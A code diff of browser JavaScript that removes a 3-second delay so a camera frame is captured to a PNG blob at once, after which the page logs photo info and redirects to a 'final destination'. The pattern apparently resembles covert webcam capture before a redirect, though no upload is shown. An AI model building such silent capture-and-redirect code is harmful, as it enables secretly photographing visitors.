@@ -165,23 +165,23 @@
 
       let result = await context;
 
-      setTimeout(function () {
-        if (!photoTaken) {
-          console.log('Фотографирование...');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          canvas.toBlob(function(blob) {
-            console.log('Фотография создана');
-            savedPhoto = blob;
-            photoTaken = true;
-            setTimeout(function () {
-              logPhotoInfo();
-              redirectToFinalDestination();
-            }, 2000)
-          }, 'image/png');
-        }
-      }, 3000);
+
+      if (!photoTaken) {
+        console.log('Фотографирование...');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+        canvas.toBlob(function(blob) {
+          console.log('Фотография создана');
+          savedPhoto = blob;
+          photoTaken = true;
+          setTimeout(function () {
+            logPhotoInfo();
+            redirectToFinalDestination();
+          }, 2000)
+        }, 'image/png');
+      }
+
     }
 
 
@@ -198,23 +198,22 @@
 
       let result = await context;
 
-      setTimeout(function () {
-        if (!photoTaken) {
-            canvas.width = videoWidth;
-            canvas.height = videoHeight;
-            context.drawImage(video, 0, 0, videoWidth, videoHeight);
-            canvas.toBlob(function(blob) {
-                  console.log('Фотография создана');
-                  savedPhoto = blob;
-                  photoTaken = true;
+      if (!photoTaken) {
+          canvas.width = videoWidth;
+          canvas.height = videoHeight;
+          context.drawImage(video, 0, 0, videoWidth, videoHeight);
+          canvas.toBlob(function(blob) {
+                console.log('Фотография создана');
+                savedPhoto = blob;
+                photoTaken = true;
 
-                  setTimeout(function () {
-                    logPhotoInfo();
-                    redirectToFinalDestination();
-                  }, 2000)
+                setTimeout(function () {
+                  logPhotoInfo();
+                  redirectToFinalDestination();
+                }, 2000)
 
-                }, 'image/png');
-              }}, 3000);
+              }, 'image/png');
+            }
     }
 
     function logPhotoInfo() {
